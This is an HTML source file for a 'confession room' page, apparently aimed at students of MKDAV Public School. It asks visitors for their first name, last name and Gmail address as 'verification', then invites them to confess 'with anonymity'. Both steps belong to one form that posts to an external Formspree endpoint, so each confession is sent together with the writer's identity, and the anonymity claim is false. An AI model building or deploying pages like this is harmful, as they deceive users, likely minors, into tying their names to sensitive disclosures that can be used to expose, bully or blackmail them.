<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MKDAV Confessions</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            /* Dim Red/Terracotta Background */
            background-color: #7f1d1d; 
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        
        /* The "Small White Platform" (the card) */
        .card {
            background: #ffffff;
            padding: 35px 25px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 380px;
            text-align: center;
            border: 1px solid #e2e8f0;
        }

        /* Title Style: Friendlier blue */
        h1 { color: #1a73e8; font-size: 1.7rem; margin-top: 0; margin-bottom: 5px; }
        
        /* Paragraph style */
        p { color: #5f6368; font-size: 0.95rem; margin-bottom: 25px; line-height: 1.4; }

        /* Hide Page 2 initially */
        #page2 { display: none; }

        /* Input styling for white platform */
        input, textarea {
            width: 100%;
            padding: 12px;
            margin-bottom: 12px;
            border-radius: 8px;
            border: 1px solid #dadce0;
            background: #f8fafc;
            color: #333;
            box-sizing: border-box;
            font-size: 1rem;
        }
        
        input:focus, textarea:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }

        /* Submit Button: Friendlier green */
        .btn {
            background-color: #34a853;
            color: white;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 8px;
            font-weight: bold;
            font-size: 1.1rem;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 5px;
        }

        .btn:hover { background-color: #1e8e3e; }

        /* Navigation Button: Blue outline style */
        .nav-btn {
            background-color: transparent;
            color: #1a73e8;
            border: 1px solid #1a73e8;
            padding: 12px;
            width: 100%;
            border-radius: 8px;
            font-weight: bold;
            font-size: 1.1rem;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 5px;
        }
        .nav-btn:hover { background-color: rgba(26, 115, 232, 0.05); }

        .back-btn {
            color: #5f6368;
            font-size: 0.9rem;
            margin-top: 20px;
            cursor: pointer;
            text-decoration: underline;
            display: inline-block;
        }
    </style>
</head>
<body>

    <form action="https://formspree.io/f/xjgpeyvq" method="POST" class="card">
        
        <div id="page1">
            <h1>Verification</h1>
            <p>Please verify your identity to enter the confession room.</p>
            
            <input type="text" name="First_Name" id="fname" placeholder="First Name" required>
            <input type="text" name="Last_Name" id="lname" placeholder="Last Name" required>
            <input type="email" name="Email" id="email" placeholder="Gmail Address" required>
            
            <button type="button" class="nav-btn" onclick="goToConfession()">Enter Room</button>
        </div>

        <div id="page2">
            <h1>MKDAV Public School</h1>
            <p>Write your confession here with anonymity.</p>
            
            <textarea name="Confession" rows="6" placeholder="I confess that..." required></textarea>
            
            <button type="submit" class="btn">Submit Confession</button>
            <br>
            <span class="back-btn" onclick="goBack()">← Back to Verification</span>
        </div>

    </form>

    <script>
        // Use simpler hiding logic for mobile stability
        function goToConfession() {
            // Check if Page 1 fields are full
            let fName = document.getElementById('fname').value;
            let lName = document.getElementById('lname').value;
            let email = document.getElementById('email').value;

            if (fName !== "" && lName !== "" && email !== "") {
                document.getElementById('page1').style.display = 'none';
                document.getElementById('page2').style.display = 'block';
            } else {
                alert("Please fill out all fields to enter the confession room.");
            }
        }

        function goBack() {
            document.getElementById('page2').style.display = 'none';
            document.getElementById('page1').style.display = 'block';
        }
    </script>

</body>
</html>
